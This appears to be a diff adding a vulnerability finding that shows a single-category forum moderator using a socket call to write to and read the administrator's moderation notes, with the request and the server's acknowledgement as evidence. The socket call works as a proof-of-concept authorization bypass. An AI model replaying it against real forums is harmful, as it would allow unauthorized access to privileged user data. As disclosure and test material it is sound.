@@ -1,0 +1,18 @@
+### VULN-014 — Socket ack (moderator of one category attacking the admin) ###
+
+moderator session: uid=3  isAdmin=False  isGlobalModerator=False   <-- genuinely unprivileged
+
+emit user.setModerationNote {uid:1, note:"PLANTED_BY_catmod_fab14bfc_d7008c"}
+ack = [ null , [
+  {
+    "note": "<p dir=\"auto\">PLANTED_BY_catmod_fab14bfc_d7008c</p>\n",
+    "rawNote": "PLANTED_BY_catmod_fab14bfc_d7008c",
+    "uid": 3,                       <-- authored by the attacking moderator
+    "timestamp": 1790601568161,
+    "user": { "uid": 3, "username": "catmod_fab14bfc", ... }
+  }
+] ]
+
+# err == null (no authorization error) and the returned array IS the ADMIN's (uid 1) moderation-note
+# history, now containing the attacker's planted note. A non-admin/non-global-mod moderator of a single
+# category both WROTE to and READ the admin's moderation notes.
